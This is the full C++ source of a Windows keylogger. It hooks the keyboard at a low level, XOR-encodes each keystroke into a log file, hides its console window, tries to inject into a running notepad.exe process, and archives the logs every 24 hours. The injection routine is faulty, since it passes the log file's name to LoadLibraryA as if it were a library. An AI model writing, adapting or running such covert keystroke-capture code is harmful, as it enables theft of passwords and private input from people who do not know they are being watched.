#include <windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <TlHelp32.h>
#include <ctime>
using namespace std;

HHOOK hHook = NULL;
string logFile = "encrypted_log.txt";

// Simple XOR Encryption for demonstration purposes
char xorKey = 'K';
string encrypt(const string& input) {
    string output = input;
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] ^= xorKey;
    }
    return output;
}

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        ofstream file;
        file.open(logFile, ios_base::app);
        file << encrypt(string(1, char(p->vkCode)));
        file.close();
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}

void ReleaseHook() {
    UnhookWindowsHookEx(hHook);
}

void RunInBackground() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    ReleaseHook();
}

DWORD FindTargetProcessID(const string& targetProcessName) {
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &pe)) {
        do {
            if (pe.szExeFile == targetProcessName) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

void InjectIntoProcess(DWORD pid) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (process) {
        LPVOID baseAddress = VirtualAllocEx(process, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(process, baseAddress, logFile.c_str(), logFile.size(), NULL);
        CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, baseAddress, 0, NULL);
        CloseHandle(process);
    }
}

void ArchiveLogs() {
    while (true) {
        Sleep(86400000); // Archive logs every 24 hours
        string archiveFile = "archive_" + to_string(time(0)) + ".txt";
        ifstream src(logFile, ios::binary);
        ofstream dst(archiveFile, ios::binary);
        dst << src.rdbuf();
        src.close();
        dst.close();
        remove(logFile.c_str());
    }
}

int main() {
    DWORD targetPID = FindTargetProcessID("notepad.exe"); // Example target process
    if (targetPID) {
        InjectIntoProcess(targetPID);
    }
    thread background(RunInBackground);
    thread archiveLogs(ArchiveLogs);
    background.join();
    archiveLogs.join();
    return 0;
}
